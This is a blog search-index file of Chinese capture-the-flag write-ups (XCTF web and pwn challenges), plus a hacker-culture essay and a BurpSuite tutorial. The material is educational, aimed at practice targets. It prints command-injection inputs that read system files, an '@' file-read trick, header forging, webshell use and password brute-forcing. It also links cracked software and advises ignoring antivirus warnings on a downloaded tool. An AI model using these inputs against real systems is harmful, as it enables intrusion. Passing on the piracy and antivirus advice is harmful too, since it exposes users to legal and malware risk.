<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>攻防世界web进阶</title>
      <link href="/2019/09/25/2019-gong-fang-shi-jie-web-jin-jie/"/>
      <url>/2019/09/25/2019-gong-fang-shi-jie-web-jin-jie/</url>
      
        <content type="html"><![CDATA[<h1 id="攻防世界web进阶"><a href="#攻防世界web进阶" class="headerlink" title="攻防世界web进阶"></a>攻防世界web进阶</h1><h2 id="Cat"><a href="#Cat" class="headerlink" title="Cat"></a>Cat</h2><p>抓住那只猫</p><h3 id="预备知识"><a href="#预备知识" class="headerlink" title="预备知识"></a>预备知识</h3><h4 id="url编码字符集"><a href="#url编码字符集" class="headerlink" title="url编码字符集"></a>url编码字符集</h4><p>url编码是在浏览器获取的网址包含特殊字符时会将其转换为对应的编码，当然如果正常字符直接使用编码浏览器也是可以正常访问的。</p><p>当然如果获取到的编码超过了url编码的限制就可能会出现报错的情况。一般情况下编码超过%80就会出现报错</p><p><img src="https://ae01.alicdn.com/kf/Habe565cf7f7a48a19ad2d32d8fef11faD.png" alt></p><h4 id="Django-DEBUGE-True"><a href="#Django-DEBUGE-True" class="headerlink" title="Django DEBUGE = True"></a>Django DEBUGE = True</h4><ol><li>如果开启了DEBUG模式，那么以后我们修改了Django项目的代码，然后按下ctrl+s，那么Django就会自动的给我们重启项目，不需要手动重启。</li><li>如果开启了DEBUG模式，那么以后Django项目中的代码出现bug了，那么在浏览器中和控制台会打印出错信息。否则的我们很难寻找到bug的位置，也不方便调试代码。</li><li>在生产环境中，禁止开启DEBUG = True，因为当你的网站出错误时，别人能看到你的源代码，而我们也不需要给用户看到这些错误信息。所以需要关掉DEBUG = True，即设置DEBUG = False</li><li>如果设置了DEBUG = False，那么就必须设置settings.py中的ALLOWED_HOSTS.<br>ALLOWED_HOSTS：这个变量是用来设置以后别人只能通过这个变量中的ip地址或者域名来进行访问。</li></ol><h4 id="phpcurl"><a href="#phpcurl" class="headerlink" title="phpcurl"></a>phpcurl</h4><p>当<code>CURLOPT_SAFE_UPLOAD</code> 为ture时，如果在请求前面加上@的话phpcurl组件是会把后面的当作绝对路径请求来读取文件。当且仅当文件中存在中文字符时，Djanjo才会报错导致获取文件内容。</p><h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><ul><li><p>题目让我们输入域名，输入提示域名loli.club 没反应，那就输入几个常见的baidu.com也没反应，输入<code>127.0.0.1</code>返回ping的内容</p><pre><code>PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.064 ms--- 127.0.0.1 ping statistics ---1 packets transmitted, 1 received, 0% packet loss, time 0msrtt min/avg/max/mdev = 0.064/0.064/0.064/0.000 ms</code></pre><p>输入百度的ip<code>220.181.38.148</code> 也能得到ping的内容，感觉可以和控制台进行交互</p></li><li><p>尝试输入 <code>127.0.0.1||ls</code>,  <code>127.0.0.1&amp;&amp;ls</code>, <code>127.0.0.0;ls</code> 发现关键字均被屏蔽了。</p></li><li><p>尝试针对url地址进行搞事情，输入xxx?url=%80, 尝试输入超过gbk编码url编码，发现获得报错信息，赋值报错信息新建一个html文件，打开的得到最终的报错界面，发现这是一个Django的项目，并且DEBUGE 为 true。</p></li><li><p>可以判断后台运行了两个应用，一个时php应用，一个Django用来处理php发来的请求。</p></li><li><p>我们可以通过报错信息setting中的database字段获取到数据库的信息</p><p><img src="C:%5CUsers%5CMAIBENBEN%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1569379602047.png" alt="1569379602047"></p></li><li><p>访问<em><a href="http://111.198.29.45:40859/index.php?url=@/opt/api/database.sqlite3" target="_blank" rel="noopener">http://111.198.29.45:40859/index.php?url=@/opt/api/database.sqlite3</a></em>的到新的报错信息，还是复制报错信息到新的html文件中，打开发现了File字符段，应该是数据库中的内容，尝试搜索<code>ctf / flag</code>等关键字找到flag</p><p><img src="https://ae01.alicdn.com/kf/H2fadf0ab696b41c8ab3f9620cdfd2acbp.jpg" alt></p></li><li><p>答案：WHCTF{yoooo_Such_A_G00D_@}</p></li></ul><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ul><li>php通过@访问文件，Djonga报错返回文件内容</li><li>url编码越界可能会引起报错</li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> CTF </tag>
            
            <tag> 竞赛 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>凤凰挽歌，黑客独白</title>
      <link href="/2019/09/25/2019-feng-huang-wan-ge-hei-ke-du-bai/"/>
      <url>/2019/09/25/2019-feng-huang-wan-ge-hei-ke-du-bai/</url>
      
        <content type="html"><![CDATA[<p><strong>这是一片很早转载自《黑客x档案》的一篇文章，是一篇影响我很深的文章，这个杂志已经停刊了，在博客中置顶表达我的敬意。</strong></p><p>还记得当年的5月1日—5月7日吗？美国黑客组织PoisonBox、Prophet、Hi-Tech等，对中国发动了来自网络的攻击，为了捍卫祖国和民族的尊严，中国的黑客也进行了奋力还击，当看到美国白宫网站被挂上五星红旗，所有的爱国人士无不拍手称快。</p><p>时至今日，我国的网络信息产业也得到了飞速的发展。在发展的同时，中国黑客，这一特殊的黑客群体也在茁壮成长着，从最初的“绿色兵团”到各大黑客组织的成立，中国的黑客一次又一次在捍卫祖国尊严的网络战场上展现了独一无二的魅力。</p><p>黑客本身并不是贬义词，他们由于拥有高超的计算机水平、神出鬼没的行踪，使得人们对他们的映像大多是“神秘、高超”等。其实黑客并没有一个完整的定义，不过就现在的信息安全发展来看，黑客应该具备以下技能：精通计算机各项操作、能熟练使用各种工具并了解其原理、有高超的编程（汇编等）技术、又冷静沉着的心理素质、善于和别的黑客交流等等。由于其技术和道德品质的不同，黑客往往被分为两类：黑客和伪黑客（骇客）。</p><p>有人将黑客比喻成药，在治愈疾病的同时也会带来副作用。黑客精神，是一种自由与共享，是深陷困境却寻求突破与解脱的追求，这是每一个走进黑客世界的人所向往的境界。但现今的社会，开始走向和平与稳定，这使得一些黑客失去了文争武斗的舞台。老一辈的黑客由于年纪较大，开始了“宅人”生活，他们大多以安全顾问以及安全公司的身份出现在网络中。</p><p>在这样的背景下一群年轻人怀着对祖国的热爱核对黑客神秘的崇拜，开始了他们的追求，但跟多的则是沉迷于雕虫小技的卖弄，掉进了黑色经济的大染缸里……从打着“爱国主义”旗号、“保护自己信息安全”等旗号的伪黑客培训班到公开贩卖的所谓的“顶级”黑客工具。</p><p>传统的黑客已近不多了，千百个网络流氓跳出来。利用拒绝服务攻击、盗号等手段进行敲诈、倒卖的“黑金效应”，湿的渴求利用黑客技术技术一夜暴富的流氓蜂拥而至。由于互联网本身的脆弱性和网络服务提供商的漏洞，使得这类黑色经济疯狂的滋长着。<br>一些注重自我得失而敢于铤而走险的年轻人，他们不再愤怒晋国神社扭曲历史，各大色情、赌博网站成了他们的聚居地，他们打着复制、抄袭、改写等“创新”而四处出击，各类程序上都留下了作者和联系方式，他们不再羞羞答答，而是唯恐天下不知的到处叫卖着自己所谓的作品。<br>黑客那种侠义的精神也许会在这些年轻人中间消失，他们跟多看中的是金钱、名誉、地位……他们忘记了当初自己为什么走进了黑客这个圈子，也许他们只是为了那些虚无的东西，技术只是让他们名利双收的工具罢了。<br>让我们带上耳机，听听那首《黑客独白》熟悉的旋律吧，为失去理想的黑客唱一首挽歌吧：</p><pre><code>世界总是说你说我，难道就因为，我可以直接敲打他的心窝。黑夜也是生活，黑夜白天也一样过。不要说我是什么黑客，就因为我的黑夜比白天多......</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> 心情 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BurpSuite小白安装与使用教程</title>
      <link href="/2019/09/18/2019-burpsuite-xiao-bai-ru-men-an-zhuang-yu-shi-yong/"/>
      <url>/2019/09/18/2019-burpsuite-xiao-bai-ru-men-an-zhuang-yu-shi-yong/</url>
      
        <content type="html"><![CDATA[<h1 id="Burp-Suite-安装使用教程"><a href="#Burp-Suite-安装使用教程" class="headerlink" title="Burp Suite 安装使用教程"></a>Burp Suite 安装使用教程</h1><h2 id="下载与安装（破解）"><a href="#下载与安装（破解）" class="headerlink" title="下载与安装（破解）"></a>下载与安装（破解）</h2><ul><li><p>下载链接</p><blockquote><p><a href="https://pan.baidu.com/s/1NSH0ld6Tt-8rIjQtP6axiA" target="_blank" rel="noopener">百度网盘</a> 提取码：<code>5ra1</code></p></blockquote></li><li><p>环境配置</p><p>需要安装java环境，请自行百度，谷歌。</p></li><li><p>安装破解</p><blockquote><p>下载软件，安装好环境，直接点即那个.bat文件即可直接接运行（此时已经破解过了）</p></blockquote></li></ul><h2 id="使用burp-suite-进行弱口令暴力破解"><a href="#使用burp-suite-进行弱口令暴力破解" class="headerlink" title="使用burp suite 进行弱口令暴力破解"></a>使用burp suite 进行弱口令暴力破解</h2><h3 id="运行程序创建临时工程"><a href="#运行程序创建临时工程" class="headerlink" title="运行程序创建临时工程"></a>运行程序创建临时工程</h3><p><img src="https://ae01.alicdn.com/kf/H57e718443976482091758b073258c27bd.jpg" alt></p><p><img src="https://ae01.alicdn.com/kf/H64b572c41c76457892179e9a4f97cb27X.jpg" alt></p><h3 id="添加代理端口"><a href="#添加代理端口" class="headerlink" title="添加代理端口"></a>添加代理端口</h3><p><img src="https://ae01.alicdn.com/kf/H9aea1bf00f48446280aeedaa58976bd8N.jpg" alt></p><h3 id="设置浏览器代理"><a href="#设置浏览器代理" class="headerlink" title="设置浏览器代理"></a>设置浏览器代理</h3><ul><li>Chrome 推荐使用 <code>SwitchyOmega</code> 插件</li><li>Firefox 推荐使用 <code>FoxyProxy</code> 插件</li><li>也可以直接进入浏览器的设置里面找到代理设置</li></ul><h3 id="安装证书"><a href="#安装证书" class="headerlink" title="安装证书"></a>安装证书</h3><blockquote><p>就这一步快把我给搞死了，不过还好过去了。</p></blockquote><ul><li><p>先要开启浏览器的代理</p></li><li><p>访问<code>http://burp/</code>下载证书</p><p><img src="https://ae01.alicdn.com/kf/Hb44781f2d74c4bd8beaed6121353ebe4s.jpg" alt></p></li><li><p>点击文件弹出安装证书窗口，点击安装，注意存储选择受信任的根证书颁发机构</p><p><img src="https://ae01.alicdn.com/kf/Hdeb510031c304e9085afd8a692605ba6g.jpg" alt></p></li></ul><h3 id="弱口令暴力破解"><a href="#弱口令暴力破解" class="headerlink" title="弱口令暴力破解"></a>弱口令暴力破解</h3><ul><li><p>建议关闭除了破解的网页之外的所有网页</p></li><li><p>点击刷新网页，点击 burpsuite 的 forward 推送包到浏览器</p></li><li><p>随意输入密码，用户名点击登录</p></li><li><p>再次点击forward捕获包</p><p><img src="https://ae01.alicdn.com/kf/H84548976fb40416485cb89e29cc0c822u.png" alt> </p></li><li><p>右键send inturder</p><p><img src="https://ae01.alicdn.com/kf/H8dc8c8139cd44a46bb3945c95ce8dd23h.png" alt></p><p>可以将不需要更改的关键字两边的符号删去</p></li><li><p>开始破解前需要加载破解字典</p><p><img src="https://ae01.alicdn.com/kf/H03328246e1f84b8bb61eb62f071f9874R.png" alt></p><p>点击 Start attack即可开始</p><blockquote><p>GitHub上的一个<a href="https://github.com/rootphantomer/Blasting_dictionary" target="_blank" rel="noopener">爆破字典的仓库</a></p></blockquote></li><li><p>查看结果</p><p><img src="https://ae01.alicdn.com/kf/H0116b60cc443492b9d6db6e3b29a2076w.png" alt></p></li></ul><blockquote><p>为什么设置了证书，代理也设置好了，就是加载网页时总会暂停，是因为burpsuite截取了包，此时只要点击一下pyroxy 下的 intercept 里的 Forward 按钮即可， 有不懂的地方欢迎交流</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 工具 </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界：web题(新手)</title>
      <link href="/2019/09/17/2019-gong-fang-shi-jie-web-ti-xin-shou/"/>
      <url>/2019/09/17/2019-gong-fang-shi-jie-web-ti-xin-shou/</url>
      
        <content type="html"><![CDATA[<h1 id="攻防世界-web题（新手）"><a href="#攻防世界-web题（新手）" class="headerlink" title="攻防世界 web题（新手）"></a>攻防世界 web题（新手）</h1><h2 id="view-source"><a href="#view-source" class="headerlink" title="view_source"></a>view_source</h2><p><code>X老师让小宁同学查看一个网页的源代码，但小宁同学发现鼠标右键好像不管用了。</code></p><ul><li><p>获取在线场景，进入网页</p></li><li><p>由于右键没法使用，直接从设置里进入</p><p><img src="https://ae01.alicdn.com/kf/H9197afd8fc364427ac263ef85fce5b7eE.jpg" alt></p></li><li><p>得到flag，so easy…….</p></li><li><blockquote><p>看别人的博客发现还可通过view-source:的方法来访问源码：<code>view-source:url</code></p></blockquote></li></ul><h2 id="get-post"><a href="#get-post" class="headerlink" title="get_post"></a>get_post</h2><p><code>X老师告诉小宁同学HTTP通常使用两种请求方法，你知道是哪两种吗？</code></p><ul><li><p>打开场景网页，显示让我们使用get方式提交一个a值为1的数据，那么可以直接再链接后面添加<code>?a=1</code>即可</p></li><li><p>又让我们使用post方式提交数据，可以写一个简单的包含form表单的页面来实现</p><pre class="line-numbers language-html"><code class="language-html"><span class="token doctype">&lt;!DOCTYPE html></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>POST<span class="token punctuation">"</span></span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://111.198.29.45:55483/?a<span class="token punctuation">=</span>1<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>b<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>2<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>打开页面点击提交即可。</p></li><li><p>得到答案：<code>cyberpeace{5bb0e92a4c1b563c6ae7b2190d27f12d}</code></p></li><li><p>当然使用浏览器的插件更加方便，懒得下载了，以后没办法了再说吧。。。。。</p></li></ul><h2 id="robots"><a href="#robots" class="headerlink" title="robots"></a>robots</h2><p><code>X老师上课讲了Robots协议，小宁同学却上课打了瞌睡，赶紧来教教小宁Robots协议是什么吧。</code></p><ul><li><p>关于robots协议的</p><p>robots协议就是告诉爬虫什么网页是不能爬的，爬了就要违法的，一般存放于网站的根目录，可以直接通过 域名+robots.txt获取</p></li><li><p>我们访问<code>http://111.198.29.45:37876/robots.txt</code>的到了下面的东西</p><pre><code>User-agent: *Disallow: Disallow: f1ag_1s_h3re.php</code></pre></li><li><p>接着访问<em><a href="http://111.198.29.45:37876/f1ag_1s_h3re.php" target="_blank" rel="noopener">http://111.198.29.45:37876/f1ag_1s_h3re.php</a></em>的到flag</p><p><code>cyberpeace{b6a3011aae65e9fd2d857594413f50b1}</code></p></li></ul><h2 id="backup"><a href="#backup" class="headerlink" title="backup"></a>backup</h2><p><code>X老师忘记删除备份文件，他派小宁同学去把备份文件找出来,一起来帮小宁同学吧！</code></p><h3 id="备份文件"><a href="#备份文件" class="headerlink" title="备份文件"></a>备份文件</h3><ul><li>备份文件就是编辑器或管理员再编写文件时为了防止不小心删除文件时方便的恢复而做的备份，而网站往往对备份文件疏于保护，使我们可以直接获取到。</li><li>关于备份文件的详细讲解，有篇博文写的挺好的<a href="https://www.4hou.com/technology/1958.html" target="_blank" rel="noopener">备份文件：被低估的Web威胁</a></li></ul><h3 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h3><ul><li>多试几次index.php的备份文件名，就行了</li><li>访问：<a href="http://111.198.29.45:54006/index.php.sava" target="_blank" rel="noopener">http://111.198.29.45:54006/index.php.sava</a> 的到一个文件，用记事本打开的到答案</li><li>答案：flag=”Cyberpeace{855A1C4B3401294CB6604CCC98BDE334}”</li></ul><h2 id="cookie"><a href="#cookie" class="headerlink" title="cookie"></a>cookie</h2><p><code>X老师告诉小宁他在cookie里放了些东西，小宁疑惑地想：‘这是夹心饼干的意思吗?</code></p><ul><li><p>打开网址，右键查看NETwork信息，选择all发现了两个文件，再requests headers里找到cookie字段：<code>look-here:cookie.php</code></p></li><li><p>访问<code>http://111.198.29.45:44784/cookie.php</code></p><p><img src="https://ae01.alicdn.com/kf/He6e16e0d85a941518ccba85857604a4dz.jpg" alt></p></li><li><p>还是查看network中的cookie.php，找到response headers发现了flag</p><blockquote><p>cyberpeace{35d2b66f27b94ab715ccd8d8d49431f0}</p></blockquote></li><li><p>如果netword里面没有文件就刷新一下</p></li></ul><h2 id="disabled-button"><a href="#disabled-button" class="headerlink" title="disabled_button"></a>disabled_button</h2><p><code>X老师今天上课讲了前端知识，然后给了大家一个不能按的按钮，小宁惊奇地发现这个按钮按不下去，到底怎么才能按下去呢？</code></p><ul><li>访问网址，右键检查</li><li>找到按钮标签，发现按钮有个属性<code>disabled</code> 将其直接删除，这样按钮就可以点击了</li><li>点击获取答案<code>cyberpeace{938cf1757b57a24994fc33fa86b4089a}</code></li></ul><h2 id="simple-js"><a href="#simple-js" class="headerlink" title="simple_js"></a>simple_js</h2><p><code>小宁发现了一个网页，但却一直输不对密码。(Flag格式为 Cyberpeace{xxxxxxxxx} )</code></p><ul><li><p>打开链接，让输入密码，瞎写了一个，错了。</p></li><li><p>查看网页源代码</p><ul><li><p>发现了这个<code>var pass = &quot;70,65,85,88,32,80,65,83,83,87,79,82,68,32,72,65,72,65&quot;;</code> 本来以为他是密码，转换成了 acill 码转换成字符的到了<code>&#39;FAUX PASSWORD HAHA&#39;</code> 输入HAHA, 不对</p></li><li><p>下面还有一个像是答案的东西<code>String[&quot;fromCharCode&quot;](dechiffre(&quot;\x35\x35\x2c\x35\x36\x2c\x35\x34\x2c\x37\x39\x2c\x31\x31\x35\x2c\x36\x39\x2c\x31\x31\x34\x2c\x31\x31\x36\x2c\x31\x30\x37\x2c\x34\x39\x2c\x35\x30&quot;));</code>，16进制转换成字符得到了<code>786OsErtk12</code></p><pre class="line-numbers language-python"><code class="language-python">a <span class="token operator">=</span> <span class="token string">"\x35\x35\x2c\x35\x36\x2c\x35\x34\x2c\x37\x39\x2c\x31\x31\x35\x2c\x36\x39\x2c\x31\x31\x34\x2c\x31\x31\x36\x2c\x31\x30\x37\x2c\x34\x39\x2c\x35\x30"</span>a <span class="token operator">=</span> <span class="token punctuation">[</span>int<span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> a<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">','</span><span class="token punctuation">)</span><span class="token punctuation">]</span>s <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span>chr<span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> a<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li></ul></li><li><p>构建提交答案：<code>Cyberpeace{786OsErtk12} )</code></p></li></ul><h2 id="xff-referer"><a href="#xff-referer" class="headerlink" title="xff_referer"></a>xff_referer</h2><p><code>X老师告诉小宁其实xff和referer是可以伪造的。</code></p><ul><li><p>一条curl语句搞定</p><blockquote><p>curl -X GET -H ‘X-Forwarded-For:123.123.123.123’ -H ‘Referer:<a href="https://www.google.com&#39;" target="_blank" rel="noopener">https://www.google.com&#39;</a> -i ‘题目地址’</p></blockquote><p><img src="https://ae01.alicdn.com/kf/Hf8a91ca4e13d4ca5846714ed7e73a70f3.jpg" alt></p></li><li><p>得到答案：<code>cyberpeace{e23fea2ef53f43e1bd4b2c462ffe9075}</code></p></li><li><p>参考资料</p><ul><li><a href="[https://lengjibo.github.io/%E8%B5%9B%E5%AE%81%E5%B9%B3%E5%8F%B0web%E9%A2%98%E8%A7%A3/](https://lengjibo.github.io/赛宁平台web题解/)">别人写的wp</a></li><li><a href="https://www.cnblogs.com/duhuo/p/5695256.html" target="_blank" rel="noopener">Linux curl命令详解</a>, 关于linux的url命令的博客，说的挺详细的。</li><li><a href="WEB安全-伪造X-Forwarded-For绕过服务器IP地址过滤">WEB安全-伪造X-Forwarded-For绕过服务器IP地址过滤</a></li><li><a href="http://www.ruanyifeng.com/blog/2019/06/http-referer.html" target="_blank" rel="noopener">HTTP Referer 教程</a></li></ul></li></ul><h2 id="weak-auth"><a href="#weak-auth" class="headerlink" title="weak_auth"></a>weak_auth</h2><h3 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h3><ul><li><p>打开获取到的链接，发现选用登录，胡乱输入</p></li><li><p>然后让我以admin管理员登录，输入admin，输入一个密码，对我说密码错误。</p></li><li><p>查看网页源代码<code>http://111.198.29.45:51759/check.php</code>,有提示</p><blockquote><!--maybe you need a dictionary--></blockquote></li><li><p>很明显的弱口令爆破提示：dictionary。使用<code>burp suite</code>爆破即可</p></li></ul><h3 id="实现过程"><a href="#实现过程" class="headerlink" title="实现过程"></a>实现过程</h3><blockquote><p>实现过程极为艰辛，我都快哭了，还好最后百度知道里的大佬救了我，其实也是因为我太沙雕了，，，，，</p></blockquote><ul><li><p>下载-安装-使用<code>burp suite</code>请移步我的另一篇博客。</p></li><li><p>加载弱口令文件，开始爆破</p><p><img src="https://puui.qpic.cn/fans_admin/0/3_1409075683_1568810669247/0" alt></p><p><code>123456</code> 的返回长度不一样，点击查看response发现答案<code>cyberpeace{748c243fe73aa5339bc8795a3fa04d1d}</code>。</p></li></ul><h2 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h2><h3 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h3><ul><li><p>打开链接，发现</p><p><img src="https://ae01.alicdn.com/kf/H00b1366d5c194ff9afd8fbcad5ea7b27I.jpg" alt></p></li><li><p>一句话木马放在了index.php中，利用shell命令可以获取到后台</p></li><li><p>使用中国菜刀，获取到网站后台</p><p><img src="https://ae01.alicdn.com/kf/H88852e6a3e194ee9ad18bf890ac6412b9.jpg" alt></p><p><img src="https://ae01.alicdn.com/kf/H8e7dec0044714170875c606dcd276355f.jpg" alt></p></li><li><p>点击<code>flag.txt</code>获取到答案 <code>cyberpeace{466ada95b53dd9bce5adfd430dc401f0}</code></p></li></ul><h3 id="菜刀下载"><a href="#菜刀下载" class="headerlink" title="菜刀下载"></a>菜刀下载</h3><ul><li><p>官网已经关闭了下载，但可以从开源网站上下载</p></li><li><p>下载的文件会报毒，我是直接忽略了，可以用，应该是没毒的</p><blockquote><p>下载地址：<a href="https://sourceforge.net/projects/zhongguocaidao/files/2011caidao.zip/download" target="_blank" rel="noopener">https://sourceforge.net/projects/zhongguocaidao/files/2011caidao.zip/download</a></p></blockquote></li></ul><h2 id="command-execution"><a href="#command-execution" class="headerlink" title="command_execution"></a>command_execution</h2><p><code>小宁写了个ping功能,但没有写waf,X老师告诉她这是非常危险的，你知道为什么吗。</code></p><h3 id="Linux-命令行执行多条命令"><a href="#Linux-命令行执行多条命令" class="headerlink" title="Linux 命令行执行多条命令"></a>Linux 命令行执行多条命令</h3><ul><li><p>command1 &amp;&amp; command2</p><p>顺序执行，遇到执行失败的命令则终止</p></li><li><p>command1 || command2</p><p>顺序执行，如果有命令执行成功则终止</p></li><li><p>command1 ; command2</p><p>顺序执行，无论命令是否执行成功，直到执行完所有命令</p></li></ul><h3 id="分析过程-1"><a href="#分析过程-1" class="headerlink" title="分析过程"></a>分析过程</h3><ul><li><p>没有设置waf代表我们输入的任何东西会直接进入程序中</p></li><li><p>随意输入一个地址得到ping的结果发现程序应该是直接和系统的shell进行交互的</p></li><li><p>那么我们首先就是要构造命令查看当前目录下的文件</p><p><code>adsf; ls</code></p><p>发现就只有一个php文件</p></li><li><p>由于我们无法得到任何的文件夹名，只能向上查看文件夹中的内容，执行</p><p><code>asdf; ls ../../../</code>可以查看向上三层的文件夹中的内容</p></li><li><p>发现了一个名为 home的文件夹，查看文件夹中的内容</p><p><code>asdf; ls ../../../home</code>发现了flag.txt</p></li><li><p>执行<code>asdf; cat /home/flag.txt</code>获取到答案</p><pre><code>cyberpeace{d02b8c511da6fc03c9851f347af4414f}</code></pre></li></ul><blockquote><p>其实可以执行 <code>asdf; find / -name flag*</code>的到全部目录下所有以flag开头的文件</p><p><a href="https://blog.csdn.net/wzzfeitian/article/details/40985549" target="_blank" rel="noopener">Linux下各种查找命令（find, grep, which, whereis, locate)</a></p></blockquote><h2 id="simple-php"><a href="#simple-php" class="headerlink" title="simple_php"></a>simple_php</h2><h3 id="is-numeric-绕过"><a href="#is-numeric-绕过" class="headerlink" title="is_numeric 绕过"></a>is_numeric 绕过</h3><ul><li>isnumeric() 用来判断是否位数字，为数字则返回true, 由于php为弱类型语言，则将数字后面加上空格(%20) / 空白符(%00) 或者任意字符即可绕过</li><li>当a=0%20 是，进行<code>if(a==0)</code>判断返回的结果还是true，但<code>if(a)</code> 的结果为非零也为真。</li></ul><h3 id="解题过程-1"><a href="#解题过程-1" class="headerlink" title="解题过程"></a>解题过程</h3><ul><li><p>访问 <code>题目地址</code>+<code>/?a=0%20&amp;b=5555%20</code>即可得到答案</p><p>Cyberpeace{647E37C7627CC3E4019EC69324F66C7C}</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> CTF </tag>
            
            <tag> 竞赛 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界-pwn入门练习</title>
      <link href="/2019/09/14/2019-gong-fang-shi-jie-pwn-ru-men-lian-xi/"/>
      <url>/2019/09/14/2019-gong-fang-shi-jie-pwn-ru-men-lian-xi/</url>
      
        <content type="html"><![CDATA[<h1 id="攻防世界-pwn入门练习"><a href="#攻防世界-pwn入门练习" class="headerlink" title="攻防世界-pwn入门练习"></a>攻防世界-pwn入门练习</h1><h2 id="get-shell"><a href="#get-shell" class="headerlink" title="get_shell"></a>get_shell</h2><ul><li>直接运行即可，nc连接，cat flag获得flag<ul><li><img src="https://pic.superbed.cn/item/5d725367451253d178a1020f.jpg" alt></li></ul></li></ul><h2 id="CGfsb"><a href="#CGfsb" class="headerlink" title="CGfsb"></a>CGfsb</h2><p><code>菜鸡面对着pringf发愁，他不知道prinf除了输出还有什么作用</code></p><h3 id="基操"><a href="#基操" class="headerlink" title="基操"></a>基操</h3><ul><li><p>下载了一个文件，查看文件信息, 发现是elf文件：<img src="https://ae01.alicdn.com/kf/H5e290d1e577740ec974489f511b7270aJ.jpg" alt></p></li><li><p>ida 反编译查看源码：<img src="https://ae01.alicdn.com/kf/H4ef691700fcc4977bc3c0fcdac8b1740V.jpg" alt></p></li><li><p>根据题意，应该是要利用printf的格式化字符串漏洞，而且第<code>printf(&amp;s)</code>又明显的漏洞，与之相邻的语句很清晰的表示了，只要pwnme的值为8便会输出flag。有位博主写的这篇关于格式化字符串漏洞的<a href="http://winny.work/%e4%b8%80%e7%af%87%e6%96%87%e7%ab%a0%e6%90%9e%e6%87%82%e6%a0%bc%e5%bc%8f%e5%8c%96%e5%ad%97%e7%ac%a6%e4%b8%b2%e6%bc%8f%e6%b4%9e/358.html" target="_blank" rel="noopener">博客</a>挺好的，建议看看。还有一篇是讲内存溢出的<a href="https://www.anquanke.com/post/id/85138" target="_blank" rel="noopener">博客</a>通俗易懂还设计到了bss，不理解的可以看看。</p></li></ul><h3 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h3><ul><li><p>接下来就要确定pwnme的位置：<img src="https://ae01.alicdn.com/kf/Haa4a6b60accf4ecc87e8f2892e32a6c6J.jpg" alt></p></li><li><p>pwnme在_bss端，说明它是一个全局变量，那我们要修改它，就要利用到格式化字符串漏洞中的%n</p></li><li><p>找到偏移量<img 